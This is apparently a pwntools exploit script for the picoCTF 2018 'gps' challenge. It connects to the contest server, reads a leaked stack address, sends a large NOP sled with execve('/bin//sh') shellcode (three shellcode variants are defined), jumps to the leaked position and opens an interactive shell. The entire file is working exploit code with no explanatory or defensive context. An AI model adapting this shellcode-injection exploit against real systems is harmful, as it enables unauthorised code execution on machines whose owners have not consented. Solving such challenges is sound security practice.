#!/usr/bin/env python

from pwn import *

pico = 1

if pico:
	r = remote("2018shell2.picoctf.com", 24627)
else:
	r = process("./gps")
	gdb.attach(r, '''
		b *0x400a99
		c
		''')

shellcode_1 = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
shellcode_2 = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
shellcode_3 = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

sled = '\x90'*0x900

r.recvuntil("position: ")
position = r.recvline().strip()[2:]
print position
# position = int(position, 16)
# print hex(position)

print r.recvuntil(">")
r.sendline(sled + shellcode_2)

log.info("sent shellcode")

print r.recvuntil(">")
r.sendline(position)

log.info("sent position")

r.interactive()